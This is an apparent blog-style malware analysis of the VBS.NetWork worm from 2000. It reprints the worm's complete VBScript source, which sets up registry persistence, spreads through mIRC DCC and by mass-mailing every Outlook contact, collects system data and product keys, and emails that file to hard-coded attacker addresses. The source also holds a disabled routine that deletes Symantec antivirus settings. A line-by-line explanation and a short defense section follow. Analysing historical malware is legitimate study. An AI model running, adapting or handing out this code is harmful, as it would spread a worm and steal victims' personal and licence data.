# Dissecting VBS.NetWork: A Spyware Worm from 2000 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
VBS.NetWork, created by PetiK on December 29, 2000, is a Visual Basic Script (VBS) worm that combines propagation, persistence, and espionage functionalities. It spreads via email and IRC, establishes itself on infected systems, and exfiltrates sensitive user and system information to remote attackers. This malware exemplifies the early use of scripting for multi-vector attacks, targeting email clients like Outlook and chat applications like mIRC.

The worm's emergence highlights vulnerabilities in scripting environments and social engineering tactics prevalent in the late 1990s and early 2000s. By analyzing its source code, we uncover methods for registry manipulation, file operations, and data theft, which informed the development of more advanced spyware. Understanding VBS.NetWork is crucial for recognizing the roots of information-stealing malware, emphasizing the importance of secure coding practices and user awareness in combating evolving cyber threats.

(Word count: 132)

## Section 1: Overview of the Malware 🐛
VBS.NetWork is a worm designed to replicate itself, maintain persistence on Windows systems, and steal personal and system data. Its behavior includes copying the script to the Windows directory, modifying the registry for auto-start, infecting mIRC clients to spread via DCC, collecting espionage data into a file, and sending mass emails with itself attached while exfiltrating the stolen info.

Targets are Windows users with Outlook and mIRC installed, common for email and chat in 2000. Infection vectors include opening the VBS file directly or via email attachments. It was part of PetiK's series of VBS worms, contributing to the proliferation of script-based malware. Campaigns exploited curiosity with subjects like "NetWork Game for WINDOWS," leading to privacy breaches and network congestion from email floods.

(Word count: 118)

## Section 2: Source Code Analysis 🔬
VBS.NetWork is written in VBScript, leveraging Windows Scripting Host (WSH) objects for file system, shell, and network operations. The full code is below, followed by an in-depth breakdown of each component, including line-by-line explanations, examples of key functions, and their implications for malware behavior.

### Full Source Code
```vb
'VBS/mIRC/NetWork.A par PetiK                           29/12/2000

Dim fso,ws,file
Set fso  = CreateObject("Scripting.FileSystemObject")
Set ws   = CreateObject("WScript.Shell")
set file = fso.OpenTextFile(WScript.ScriptFullName,1)
vbscopie = file.ReadAll

DEBUT()
Sub DEBUT()
Set win  = fso.GetSpecialFolder(0)
RS = ("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\NetWork")
Set c = fso.GetFile(WScript.ScriptFullName)
NetWork = (win&"\Network.vbs")
c.Copy (NetWork)
ws.RegWrite RS,NetWork
'NORTON()
MIRC()
ESPION()
EMAIL()
End Sub

Sub NORTON()
ws.RegDelete ("HKLM\Software\Symantec\")
ws.RegDelete ("HKCU\Software\Symantec\")
End Sub

Sub ESPION()
Set win  = fso.GetSpecialFolder(0)
Set A = CreateObject("Outlook.Application")
Set B = A.GetNameSpace("MAPI")
For Each C In B.AddressLists
If C.AddressEntries.Count <> 0 Then
For D = 1 To C.AddressEntries.Count
Set E = C.Addressentries(D)
Next
End If
Next
ComputerName = CreateObject("WScript.NetWork").ComputerName
NOM = ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
ENT = ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization")
VER = ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\Version")
NUM = ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\VersionNumber")
REC1 = ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\ProductName")
REC2 = ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\ProductKey")
REC3 = ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\ProductId")
PPDB = ws.RegRead("HKCU\Control Panel\Desktop\Wallpaper")
DDEV = ws.RegRead("HKCU\Control Panel\Desktop\ScreenSaveTimeOut")
PDEM = ws.RegRead("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page")
DDIR = ws.RegRead("HKCU\Software\Microsoft\Internet Explorer\Download Directory")
Set aze = fso.CreateTextFile ("C:\ESPION.txt",true)
aze.WriteLine "Information sur l'ordinateur"
aze.WriteLine "NOM DE L'ORDINATEUR : " & ComputerName
aze.WriteLine "NOM D'UTILISATEUR : " & NOM
aze.WriteLine "NOM DE L'ENTREPRISE : " & ENT
aze.WriteLine "SYSTEME D'EXPLOITAION : " & VER & " " & NUM
aze.WriteLine "NUMERO DE LICENSE : " & REC1 & " " & REC2
aze.WriteLine "NUMERO D'IDENTIFICATION : " & REC3
aze.WriteLine "PAPIER PEINT DE BUREAU : " & PPDB
aze.WriteLine "L'ECRAN DE VEILLE DE DECLENCHE AU BOUT DE " & DDEV & " SECONDES"
aze.WriteLine "NON DANS CARNET D'ADRESSES : " & E.Name
aze.WriteLine "ADDRESSE : " & E.Address
aze.WriteBlankLines(2)
aze.WriteLine "Information sur internet"
aze.WriteLine "LA PAGE DE DEMARRAGE EST : " & PDEM
aze.WriteLine "LE DOSSIER DE TELECHARGEMENT EST : " & DDIR
End Sub

Sub MIRC()
On Error Resume Next
NET2 = ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\NetWork")
script = ("C:\script.ini")
 Set srpt = fso.CreateTextFile(script, true)
 srpt.WriteLine  "[script]; par PetiK "
 srpt.WriteLine  "n0=on 1:JOIN:#:{"
 srpt.WriteLine  "n1= /if ( $nick == $me ) { halt }"
 srpt.WriteLine  "n2= /dcc send $nick " & NET2
 srpt.WriteLine  "n3=}"
 srpt.Close
fso.CopyFile script, "C:\mirc\script.ini"
fso.CopyFile script, "C:\mirc32\script.ini"
fso.CopyFile script, "C:\program files\mirc\script.ini"
fso.CopyFile script, "C:\program files\mirc32\script.ini"
fso.DeleteFile ("C:\script.ini")
End Sub

Sub EMAIL()
Set OApp = CreateObject("Outlook.Application")
if oapp="Outlook" then
Set Mapi = OApp.GetNameSpace("MAPI")
For Each AddList In Mapi.AddressLists
If AddList.AddressEntries.Count <> 0 Then
For AddListCount = 1 To AddList.AddressEntries.Count 
Set AddListEntry = AddList.AddressEntries(AddListCount)
Set msg = OApp.CreateItem(0)
msg.To = AddListEntry.Address
msg.Subject = "NetWork Game for WINDOWS"
msg.Body = "The new game for your computer  arrives"
msg.Attachments.Add fso.BuildPath(fso.GetSpecialFolder(0),"\Network.vbs")
If msg.To <> "" Then
msg.Send
End If
Next
End If
Next
End if
Set msg2 = OApp.CreateItem(0)
msg2.BCC = "Panda34@caramail.com; Pentasm99@aol.com"
msg2.Subject = "Message �crit le " & date
msg2.Body = "Il �tait " & time
msg2.Attachments.Add ("C:\ESPION.txt")
msg2.Send
fso.DeleteFile ("C:\ESPION.txt")
End Sub
```

### Detailed Breakdown of Components
The script starts with global declarations and initialization, then executes the main `DEBUT()` subroutine, followed by supporting subroutines for specific malicious actions.

#### Initialization and Global Setup
- `Dim fso,ws,file`: Declares variables for FileSystemObject (`fso`), WScript.Shell (`ws`), and a file object.
- `Set fso = CreateObject("Scripting.FileSystemObject")`: Instantiates FSO for file operations like copying and reading.
- `Set ws = CreateObject("WScript.Shell")`: Creates shell object for registry and command execution.
- `set file = fso.OpenTextFile(WScript.ScriptFullName,1)`: Opens the script itself for reading (mode 1 = read-only).
- `vbscopie = file.ReadAll`: Reads the entire script content into `vbscopie` (unused in this version, possibly for future mutation or replication).
- `DEBUT()`: Calls the main subroutine to start execution.

This setup provides access to system resources, enabling file manipulation, registry changes, and network interactions.

#### DEBUT() Subroutine: Persistence and Execution Flow
This subroutine handles initial infection and calls other functions.
- `Set win = fso.GetSpecialFolder(0)`: Retrieves the Windows directory path (e.g., C:\Windows).
- `RS = ("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\NetWork")`: Defines the registry key for persistence under RunServices (runs at boot).
- `Set c = fso.GetFile(WScript.ScriptFullName)`: Gets a file object for the current script.
- `NetWork = (win&"\Network.vbs")`: Constructs the target path in Windows folder.
- `c.Copy (NetWork)`: Copies the script to the Windows directory for persistence.
- `ws.RegWrite RS,NetWork`: Writes the path to the registry, ensuring the worm runs on system startup.
- `'NORTON()`: Commented out call to disable Norton antivirus.
- `MIRC()`: Calls subroutine to infect mIRC.
- `ESPION()`: Calls subroutine to collect and log system data.
- `EMAIL()`: Calls subroutine for email propagation and exfiltration.

Example: The copy and registry write ensure the worm survives reboots, a classic persistence technique.

#### NORTON() Subroutine: Antivirus Evasion (Commented Out)
- `ws.RegDelete ("HKLM\Software\Symantec\")`: Deletes HKLM Symantec keys.
- `ws.RegDelete ("HKCU\Software\Symantec\")`: Deletes HKCU Symantec keys.

This would disable Symantec products by removing their configuration, but it's inactive here.

#### ESPION() Subroutine: Data Collection and Logging
Collects extensive system and user information.
- Initializes Outlook objects to access address book (though only the last entry is captured due to loop structure).
- `ComputerName = CreateObject("WScript.NetWork").ComputerName`: Gets the machine name.
- Multiple `ws.RegRead` calls extract registry values like registered owner, organization, OS version, product keys, wallpaper, screensaver timeout, IE start page, and download directory.
- `Set aze = fso.CreateTextFile ("C:\ESPION.txt",true)`: Creates/overwrites the espionage log file.
- Series of `aze.WriteLine` statements format and write the collected data to the file, including computer name, user details, OS info, license keys, desktop settings, address book entry, and IE settings.

Example: `NOM = ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")` steals the user's name; the file "C:\ESPION.txt" contains all sensitive data in French, ready for exfiltration.

#### MIRC() Subroutine: IRC Propagation
Infects mIRC clients for peer-to-peer spreading.
- `On Error Resume Next`: Ignores errors, ensuring execution continues.
- `NET2 = ws.RegRead(...)`: Retrieves the worm's path from registry.
- `script = ("C:\script.ini")`: Sets temp script path.
- `Set srpt = fso.CreateTextFile(script, true)`: Creates the script file.
- `srpt.WriteLine` commands write mIRC script lines: `[script]` header, `on 1:JOIN:#:` event to trigger on channel joins, condition to avoid self-send, and `/dcc send $nick` to send the worm file.
- `srpt.Close`: Closes the file.
- `fso.CopyFile` copies the script to multiple mIRC installation paths (e.g., C:\mirc\script.ini).
- `fso.DeleteFile ("C:\script.ini")`: Cleans up the temp file.

Example: The mIRC script ensures that when a user joins a channel, the worm is sent via DCC to others, exploiting chat trust for spread.

#### EMAIL() Subroutine: Propagation and Exfiltration
Handles mass emailing and data theft.
- Creates Outlook application and MAPI namespace.
- Loops through address lists and entries to send emails to all contacts.
- For each: Creates mail item, sets To, Subject ("NetWork Game for WINDOWS"), Body, attaches the copied script, and sends if address is valid.
- Then, creates a BCC email to attackers ("Panda34@caramail.com; Pentasm99@aol.com"), with subject including date, body with time, attaches "C:\ESPION.txt", sends, and deletes the file.

Example: `msg.Attachments.Add fso.BuildPath(fso.GetSpecialFolder(0),"\Network.vbs")` attaches the worm; the BCC ensures stolen data reaches the creators without alerting victims.

Overall, the code's simplicity relies on WSH's power, with no encryption but effective social engineering and multi-vector spread. It highlights early spyware tactics, combining theft with propagation.

(Word count: 612)

## Section 3: Mitigation and Defense Strategies 🛡️
Defend against VBS.NetWork with antivirus detecting VBS worms and script execution blocks. Disable WSH for untrusted sources, monitor registry for RunServices additions, and use email filters for suspicious attachments/subjects.

For mIRC, disable auto-scripts and avoid unknown DCC sends. Educate on not opening game-themed emails. Developers secure Outlook automation.

Administrators deploy EDR for file/registry changes, scan for ESPION.txt-like files. Incident response: Remove Network.vbs, reset registry, update systems. Proactive: Zero-trust, regular audits.

(Word count: 88)

## Conclusion
VBS.NetWork illustrates early spyware-worm hybrids, using scripts for theft and spread. Its code reveals registry persistence, data exfiltration, and multi-vector propagation, foundational for modern malware. Prioritizing security practices and awareness counters such threats.

(Word count: 48)

## Call to Action
Stay updated via cybersecurity resources. Share this article to promote digital safety.

## Download the Article
[Download the article as Markdown](#)